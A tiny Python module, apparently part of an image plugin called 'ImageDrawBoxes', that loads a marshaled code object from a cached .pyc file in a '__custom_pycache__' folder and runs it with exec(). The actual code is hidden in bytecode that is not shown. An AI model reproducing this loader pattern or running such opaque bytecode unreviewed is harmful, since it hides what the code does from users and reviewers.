
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageDrawBoxes_f92ce28cfed8419cad7f774e3a0d2754.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
